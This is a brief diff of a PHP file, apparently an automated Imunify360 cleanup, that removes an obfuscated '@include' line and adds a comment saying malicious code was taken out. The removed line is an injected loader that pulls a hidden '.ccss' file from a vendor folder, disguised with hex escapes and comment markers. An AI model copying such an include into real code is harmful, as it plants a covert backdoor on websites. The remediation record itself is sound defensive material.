@@ -1,7 +1,13 @@
 <?php
 /*98b2d*/
 
-@include /*iz*/("/home/r10w01h0\x75jkt/goplasticfree.in/ongc/vendor/phar\x2dio/.0ab6657b.ccss");
+
+/**
+* Note: This file may contain artifacts of previous malicious infection.
+* However, the dangerous code have been removed, and the file is now safe to use.
+* Feel free to contact Imunify support team at https://www.imunify360.com/support/new
+*/
+
 
 /*98b2d*/
 
